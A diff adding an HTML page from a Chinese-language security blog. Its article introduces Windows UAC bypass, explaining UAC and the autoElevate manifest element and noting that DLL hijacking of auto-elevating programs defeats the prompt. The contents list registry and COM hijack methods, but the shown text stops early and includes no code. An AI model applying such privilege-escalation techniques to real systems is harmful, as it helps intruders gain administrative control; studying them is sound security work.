@@ -1,0 +1,1748 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/">
+      
+      
+        <link rel="next" href="../1/">
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-9.1.3">
+    
+    
+      
+        <title>BypassUAC入门刊 - ConsT27's Blog|要做一个低素质玩家</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.c4a75a56.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.a0c5b2b5.min.css">
+      
+      
+
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="" data-md-color-accent="">
+  
+    
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#bypass-uac" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href=".." title="ConsT27&#39;s Blog|要做一个低素质玩家" class="md-header__button md-logo" aria-label="ConsT27's Blog|要做一个低素质玩家" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            ConsT27's Blog|要做一个低素质玩家
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              BypassUAC入门刊
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="ConsT27&#39;s Blog|要做一个低素质玩家" class="md-nav__button md-logo" aria-label="ConsT27's Blog|要做一个低素质玩家" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    ConsT27's Blog|要做一个低素质玩家
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../about/" class="md-nav__link">
+        About
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        Home
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+          提权
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          提权
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Windows%E6%8F%90%E6%9D%83/" class="md-nav__link">
+        Windows提权入门刊
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/" class="md-nav__link">
+        Linux提权入门刊
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          BypassUAC入门刊
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        BypassUAC入门刊
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#uac" class="md-nav__link">
+    UAC
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#autoelevaterequestedexecutionlevel" class="md-nav__link">
+    autoElevate与requestedExecutionLevel
+  </a>
+  
+    <nav class="md-nav" aria-label="autoElevate与requestedExecutionLevel">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#autoelevate" class="md-nav__link">
+    autoElevate
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#requestedexecutionlevel" class="md-nav__link">
+    requestedExecutionLevel
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    白名单程序
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dll" class="md-nav__link">
+    DLL劫持
+  </a>
+  
+    <nav class="md-nav" aria-label="DLL劫持">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1" class="md-nav__link">
+    实践出真知1
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2" class="md-nav__link">
+    实践出真知2
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#clrdll" class="md-nav__link">
+    CLR加载任意DLL
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    白名单程序
+  </a>
+  
+    <nav class="md-nav" aria-label="白名单程序">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#odbcad32exe" class="md-nav__link">
+    odbcad32.exe
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    管理工具
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    注册表劫持
+  </a>
+  
+    <nav class="md-nav" aria-label="注册表劫持">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#fodhelperexe" class="md-nav__link">
+    Fodhelper.exe
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sdclt" class="md-nav__link">
+    sdclt
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#eventvmr" class="md-nav__link">
+    eventvmr
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#com" class="md-nav__link">
+    COM劫持
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#com_1" class="md-nav__link">
+    利用com接口
+  </a>
+  
+    <nav class="md-nav" aria-label="利用com接口">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#icmluautil" class="md-nav__link">
+    ICMLuaUtil
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#uacme" class="md-nav__link">
+    UACME
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+          内网渗透
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          内网渗透
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Windows内网基础概览.md" class="md-nav__link">
+        Windows内网渗透入门刊
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        Windows内网渗透信息搜集指令大全
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        ARP欺骗&DNS欺骗&mac泛洪攻击
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        Windows名称解析与相应攻击方法
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        横向移动与域控权限维持方法总汇
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        超级水文我自己都不想看第二遍的Mimikatz分析
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        powershell脚本的分析
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        家人们来学习代理怎么用
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+          权限维持
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_5">
+          <span class="md-nav__icon md-icon"></span>
+          权限维持
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        win&linux本地权限维持入门刊
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+          JAVA安全
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_6">
+          <span class="md-nav__icon md-icon"></span>
+          JAVA安全
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        java安全入门刊
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        7u21链浅析
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        JNDI注入原理浅析
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        CommonsBeanUtils 反序列化
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        RMI ATTACK,攻击RMi
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        C3P0链
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        Hessian反序列化
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        shiro反序列化(shiro-550与shiro-721)
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        Spel表达式注入&相关组件的Spel表达式注入分析
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        ognl 注入
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        Log4j2 RCE
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        看我教你怎么打烂Mybatis（指审计）
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        浅析Weblogic 反序列化漏洞
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        java agent内存马
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        Spring Controller内存马
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        tomcat Listener，Filter内存马简要分析
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+          钓鱼
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_7">
+          <span class="md-nav__icon md-icon"></span>
+          钓鱼
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        钓鱼技巧入门杂烩
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
+          免杀
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_8">
+          <span class="md-nav__icon md-icon"></span>
+          免杀
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        基础免杀手法暴风吸入
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        WEB人从0开始用C++写一个加壳器
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
+          一些应用的攻击方式
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_9">
+          <span class="md-nav__icon md-icon"></span>
+          一些应用的攻击方式
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        常见中间件的攻击方式入门刊
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        redis攻击方式入门刊
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        MongoDB 注入入门刊
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        针对EXCHANGE的攻击方式
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="0">
+          一些云相关应用的攻击方式
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_10">
+          <span class="md-nav__icon md-icon"></span>
+          一些云相关应用的攻击方式
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        教你怎么日烂k8s
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        教你怎么日烂Docker
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        浅日一下AWS
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        浅日一下阿里云
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        云原生概念入门刊
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_11" id="__nav_11_label" tabindex="0">
+          乐子
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_11_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_11">
+          <span class="md-nav__icon md-icon"></span>
+          乐子
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        教你怎么在valorant玩sova打烂东南亚猴子的狗头
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        牛批轰轰的深度学习大览
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#uac" class="md-nav__link">
+    UAC
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#autoelevaterequestedexecutionlevel" class="md-nav__link">
+    autoElevate与requestedExecutionLevel
+  </a>
+  
+    <nav class="md-nav" aria-label="autoElevate与requestedExecutionLevel">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#autoelevate" class="md-nav__link">
+    autoElevate
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#requestedexecutionlevel" class="md-nav__link">
+    requestedExecutionLevel
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    白名单程序
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dll" class="md-nav__link">
+    DLL劫持
+  </a>
+  
+    <nav class="md-nav" aria-label="DLL劫持">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1" class="md-nav__link">
+    实践出真知1
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2" class="md-nav__link">
+    实践出真知2
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#clrdll" class="md-nav__link">
+    CLR加载任意DLL
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    白名单程序
+  </a>
+  
+    <nav class="md-nav" aria-label="白名单程序">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#odbcad32exe" class="md-nav__link">
+    odbcad32.exe
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    管理工具
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    注册表劫持
+  </a>
+  
+    <nav class="md-nav" aria-label="注册表劫持">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#fodhelperexe" class="md-nav__link">
+    Fodhelper.exe
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sdclt" class="md-nav__link">
+    sdclt
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#eventvmr" class="md-nav__link">
+    eventvmr
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#com" class="md-nav__link">
+    COM劫持
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#com_1" class="md-nav__link">
+    利用com接口
+  </a>
+  
+    <nav class="md-nav" aria-label="利用com接口">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#icmluautil" class="md-nav__link">
+    ICMLuaUtil
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#uacme" class="md-nav__link">
+    UACME
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+<h1 id="bypass-uac">Bypass UAC</h1>
+<h2 id="uac">UAC</h2>
+<p>用户帐户控制（User Account Control，简写作UAC)是<a href="https://baike.baidu.com/item/微软" title="微软">微软</a>公司在其[Windows Vista](<a href="https://baike.baidu.com/item/Windows" title="https://baike.baidu.com/item/Windows">https://baike.baidu.com/item/Windows</a> Vista)及更高版本操作系统中采用的一种控制机制，保护系统进行不必要的更改，提升操作系统的稳定性和安全性。
+管理员在正常情况下是以低权限运行任务的，这个状态被称为被保护的管理员。但当管理员要执行高风险操作（如安装程序等），就需要提升权限去完成这些任务。这个提升权限的过程通常是这样的，相信各位都眼熟过。</p>
+<p><img alt="image-20210227191310985" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210227191310985.png" title="image-20210227191310985" /></p>
+<p>点击“是”，管理员就会提升到高权限再去运行该任务。</p>
+<h2 id="autoelevaterequestedexecutionlevel">autoElevate与requestedExecutionLevel</h2>
+<h3 id="autoelevate">autoElevate</h3>
+<p>当某个EXE文件的文件清单里有\<autoElevate> 元素时，当执行该文件时会默认提权执行。
+我们劫持该exe文件的dll，可以达到Bypass UAC提权的目的。
+适用范围:管理员权限以获得，要得到高权限管理员权限</p>
